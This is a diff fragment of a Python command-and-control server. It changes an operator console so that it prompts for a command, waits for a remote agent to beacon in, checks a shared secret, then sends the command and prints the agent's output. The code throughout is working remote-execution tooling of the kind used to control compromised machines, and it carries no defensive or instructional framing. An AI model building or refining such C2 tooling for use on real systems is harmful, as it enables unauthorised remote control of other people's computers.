@@ -54,25 +54,53 @@ def main():
 
     print(f"[+] Listening on port {PORT}...")
 
-    while True:
-        conn, addr = server.accept()
-        # print(f"[+] Connection from {addr}")
+    # while True:
+    #     conn, addr = server.accept()
+    #     # print(f"[+] Connection from {addr}")
 
-        if not authenticate(conn, SECRET):
-            print("[-] Authentication failed")
-            conn.close()
-            continue
+    #     if not authenticate(conn, SECRET):
+    #         print("[-] Authentication failed")
+    #         conn.close()
+    #         continue
 
-        command = input("> ").strip()
+    #     command = input("> ").strip()
 
-        if not command:
-            # print("[!] Empty command, try again")
-            conn.close()
-            continue
+    #     if not command:
+    #         # print("[!] Empty command, try again")
+    #         conn.close()
+    #         continue
         
+    #     if command.lower() == "exit":
+    #         print("[*] Closing connection")
+    #         sys.exit(0)
+
+    #     conn.sendall(command.encode())
+
+    #     output = conn.recv(8192)
+
+    #     if not output:
+    #         print("[-] No response")
+    #     else:
+    #         print(output.decode())
+
+    #     conn.close()
+    while True:
+        # Get a non-empty command BEFORE waiting for the agent to beacon in
+        while True:
+            command = input("> ").strip()
+            if command:
+                break
+
         if command.lower() == "exit":
             print("[*] Closing connection")
             sys.exit(0)
+
+        # Now wait for the next beacon
+        conn, addr = server.accept()
+
+        if not authenticate(conn, SECRET):
+            conn.close()
+            continue
 
         conn.sendall(command.encode())
 
